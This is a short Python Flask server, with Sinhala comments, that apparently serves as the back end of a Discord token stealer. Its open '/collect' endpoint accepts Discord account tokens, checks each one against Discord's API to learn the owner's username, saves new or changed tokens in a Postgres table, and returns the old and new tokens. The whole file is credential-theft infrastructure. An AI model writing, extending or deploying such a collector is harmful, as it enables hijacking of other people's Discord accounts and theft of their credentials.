from flask import Flask, request, jsonify
from flask_cors import CORS
import psycopg2
import os
import requests

app = Flask(__name__)
CORS(app)

DB_URL = os.environ.get('DATABASE_URL')

def get_db_connection():
    return psycopg2.connect(DB_URL)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    token = data.get('token')
    
    # 1. Discord එකෙන් Username එක ලබා ගැනීම
    headers = {'Authorization': token}
    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if r.status_code != 200:
        return jsonify({"status": "error", "message": "Invalid Token"}), 401
    
    username = r.json().get('username')

    conn = get_db_connection()
    cur = conn.cursor()
    
    # 2. Database එකේ Username එක හරහා පරීක්ෂා කිරීම
    cur.execute("SELECT token FROM tokens WHERE username = %s ORDER BY id DESC LIMIT 1", (username,))
    last_row = cur.fetchone()
    
    status = "Not Changed"
    if not last_row or last_row[0] != token:
        status = "Changed"
        # අලුත් ටෝකනයක් නම් පමණක් Save කරන්න
        cur.execute("INSERT INTO tokens (username, token) VALUES (%s, %s)", (username, token))
        conn.commit()
    
    cur.close()
    conn.close()
    
    return jsonify({
        "status": status,
        "username": username,
        "new_token": token,
        "old_token": last_row[0] if last_row else "None"
    }), 200

# Table එක සාදන කොටස (Username column එකද සහිතව)
def create_table():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS tokens (
            id SERIAL PRIMARY KEY,
            username TEXT,
            token TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

create_table()

if __name__ == '__main__':
    app.run()
